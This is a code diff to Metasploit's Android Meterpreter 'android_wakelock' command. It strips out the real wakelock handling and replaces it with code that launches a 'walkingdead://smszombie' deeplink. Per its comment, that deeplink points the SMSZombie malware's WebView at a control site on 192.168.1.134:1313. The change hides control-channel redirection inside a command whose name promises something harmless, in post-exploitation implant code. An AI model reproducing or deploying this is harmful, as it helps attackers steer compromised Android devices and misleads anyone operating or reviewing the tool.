@@ -1,36 +1,55 @@
 package com.metasploit.meterpreter.android;
 
-import android.content.Context;
-import android.os.PowerManager;
+import android.database.Cursor;
+import android.net.Uri;
+
 import com.metasploit.meterpreter.AndroidMeterpreter;
 import com.metasploit.meterpreter.Meterpreter;
 import com.metasploit.meterpreter.TLVPacket;
-import com.metasploit.meterpreter.TLVType;
 import com.metasploit.meterpreter.command.Command;
+
+import android.app.PendingIntent;
+import android.content.BroadcastReceiver;
+import android.content.Intent;
+import android.content.IntentFilter;
+import android.app.Activity;
+import android.content.Context;
+import android.net.Uri;
+import android.content.ActivityNotFoundException;
+import android.content.ComponentName;
+import android.content.pm.PackageManager;
+import android.content.pm.ResolveInfo;
 
 public class android_wakelock implements Command {
 
-    private PowerManager.WakeLock wakeLock = null;
 
     @Override
-    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
-        final Context context = AndroidMeterpreter.getContext();
-        if (context == null) {
-            return ERROR_FAILURE;
+    public int execute(Meterpreter meterpreter, TLVPacket request,
+                       TLVPacket response) throws Exception {
+
+
+        AndroidMeterpreter androidMeterpreter = (AndroidMeterpreter) meterpreter;
+        final Context context = androidMeterpreter.getContext();
+
+
+
+       /* Android Q poses limitations on starting activities
+        *
+        * https://developer.android.com/guide/components/activities/background-starts
+        */
+
+        // Starts intent with deeplink to navigate SMSZombie's WebView to control website
+        try {
+            Intent intent = new Intent("android.intent.action.VIEW",
+                        Uri.parse("walkingdead://smszombie/?url=http://192.168.1.134:1313"));
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            context.startActivity(intent);
+
+        } catch (ActivityNotFoundException e) {
+          return ERROR_FAILURE;
         }
-        int flags = request.getIntValue(TLVType.TLV_TYPE_FLAGS);
-        if (wakeLock == null) {
-            if (flags != 0) {
-                PowerManager powerManager = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
-                wakeLock = powerManager.newWakeLock(flags, android_wakelock.class.getSimpleName());
-                wakeLock.acquire();
-            }
-        } else {
-            if (flags == 0) {
-                wakeLock.release();
-                wakeLock = null;
-            }
-        }
+
         return ERROR_SUCCESS;
     }
+
 }
